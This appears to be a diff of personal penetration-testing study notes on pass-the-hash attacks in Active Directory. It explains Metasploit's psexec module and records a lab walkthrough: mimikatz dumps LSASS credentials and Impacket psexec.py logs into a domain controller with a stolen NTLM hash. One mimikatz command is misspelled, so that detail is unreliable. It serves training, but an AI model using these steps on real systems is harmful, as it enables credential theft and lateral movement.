@@ -419,7 +419,7 @@ Microsoft Windows [Version 10.0.20348.3091]
 C:\Windows\system32>
 ```
 ## Pass-the-hash with Metasploit
-* Alternatively to PsExec, Metasploit has a PsExec exploit module, `exploit/windows/smb/psexec`, which allows you to run a pass-the-hash attack against a target:
+* Alternatively to PsExec, Metasploit has a PsExec exploit module, `exploit/windows/smb/psexec`, which allows you to run a pass-the-hash attack against a target. You can run this module if you have a Meterpreter session on a target or by providing the target IP address, the `SMBUser`, `SMBPass`, and Meterpreter payload. For `SMBPass`, you'll need to enter the following hash: `aad3b435b51404eeaad3b435b51404ee:<NTLM Hash>` because if Mimikatz only provides the NTLM hash, you'll need to provide an empty LAN manager (LM) hash for this exploit to work properly. The provided hash represents an empty LM hash, which you'll need to follow with a colon and the NTLM hash. You will gain a shell if the target is successfully exploited. 
 ```
 Module options (exploit/windows/smb/psexec):
 
@@ -460,4 +460,8 @@ Exploit target:
   --  ----
   0   Automatic
 ```
-
+### Lab: Introduction to Active Directory: Pass-the-Hash
+* **Goal**: Move laterally from the target to the domain controller using a pass-the-hash attack. You'll first need to find an NTLM hash by dumping logged-in users from LSASS on the target. Once you have the NTLM hash, you will then need to use Mimikatz or psexec.py to escalate your privileges and authenticate to DC. 
+* **Task 1**: `xfreerdp /v:10.102.45.217 /u:m.garza /dynamic-resolution +clipboard +drives /drive:share,/home/kali`
+* **Task 2**: Moved mimikatz.exe to target desktop through shared. Ran mimikatz.exe as admin --> `privilege::debug` --> `sekuralsa::logonpasswords`
+* **Task 3**: On attack box, Impacket `./psexec.py -hashes :<E.MILLER HASH> ORCHID/e.miller@<TARGET IP>`. I chose this NTLM hash because I noticed `e.miller` was logged into "DC01" and his SID began with 1, so it was created by an admin. I then navigated the file system for token file as instructed. 
